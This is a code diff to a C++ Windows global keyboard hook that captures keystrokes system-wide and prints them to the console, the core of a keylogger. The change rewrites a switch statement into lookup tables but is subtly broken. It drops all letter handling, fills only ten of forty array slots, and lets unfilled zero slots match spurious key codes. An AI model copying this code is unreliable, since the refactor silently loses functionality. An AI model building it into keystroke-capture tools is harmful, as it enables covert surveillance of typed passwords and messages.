@@ -14,6 +14,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	BOOL inKey = FALSE;
 	DWORD SHIFT_key = 0;
+	unsigned int vCode[40] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39};
+	char lowCase[40] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
+	char upCase[40] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
+
 	
 	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
@@ -21,225 +25,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 		SHIFT_key = GetAsyncKeyState(VK_SHIFT);
 
-		switch (p->vkCode)
+		for (int i = 0; i < 40; i++)
 		{
-		case 0x30:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '0';
-			else
-				cout << ')';
-			break;
-		case 0x31:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '1';
-			else
-				cout << '!';
-			break;
-		case 0x32:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '2';
-			else
-				cout << '@';
-			break;
-		case 0x33:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '3';
-			else
-				cout << '#';
-			break;
-		case 0x34:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '4';
-			else
-				cout << '$';
-			break;
-		case 0x35:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '5';
-			else
-				cout << '%';
-			break;
-		case 0x36:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '6';
-			else
-				cout << '^';
-			break;
-		case 0x37:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '7';
-			else
-				cout << '&';
-			break;
-		case 0x38:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '8';
-			else
-				cout << '*';
-			break;
-		case 0x39:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << '9';
-			else
-				cout << '(';
-			break;
-		case 0x41:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'a';
-			else
-				cout << 'A';
-			break;
-		case 0x42:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'b';
-			else
-				cout << 'B';
-			break;
-		case 0x43:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'c';
-			else
-				cout << 'C';
-			break;
-		case 0x44:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'd';
-			else
-				cout << 'D';
-			break;
-		case 0x45:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'e';
-			else
-				cout << 'E';
-			break;
-		case 0x46:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'f';
-			else
-				cout << 'F';
-			break;
-		case 0x47:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'g';
-			else
-				cout << 'G';
-			break;
-		case 0x48:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'h';
-			else
-				cout << 'H';
-			break;
-		case 0x49:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'i';
-			else
-				cout << 'I';
-			break;
-		case 0x4A:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'j';
-			else
-				cout << 'J';
-			break;
-		case 0x4B:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'k';
-			else
-				cout << 'K';
-			break;
-		case 0x4C:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'l';
-			else
-				cout << 'L';
-			break;
-		case 0x4D:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'm';
-			else
-				cout << 'M';
-			break;
-		case 0x4E:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'n';
-			else
-				cout << 'N';
-			break;
-		case 0x4F:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'o';
-			else
-				cout << 'O';
-			break;
-		case 0x50:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'p';
-			else
-				cout << 'P';
-			break;
-		case 0x51:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'q';
-			else
-				cout << 'Q';
-			break;
-		case 0x52:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'r';
-			else
-				cout << 'R';
-			break;
-		case 0x53:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 's';
-			else
-				cout << 'S';
-			break;
-		case 0x54:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 't';
-			else
-				cout << 'T';
-			break;
-		case 0x55:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'u';
-			else
-				cout << 'U';
-			break;
-		case 0x56:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'v';
-			else
-				cout << 'V';
-			break;
-		case 0x57:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'w';
-			else
-				cout << 'W';
-			break;
-		case 0x58:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'x';
-			else
-				cout << 'X';
-			break;
-		case 0x59:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'y';
-			else
-				cout << 'Y';
-			break;
-		case 0x5A:
-			if (GetAsyncKeyState(VK_SHIFT) >= 0)
-				cout << 'z';
-			else
-				cout << 'Z';
-			break;
+			if (p->vkCode == vCode[i])
+			{
+				if (GetAsyncKeyState(VK_SHIFT) >= 0)
+					cout << lowCase[i];
+				else
+					cout << upCase[i];
+			}
 		}
+
 	}
 	return(inKey ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
 }
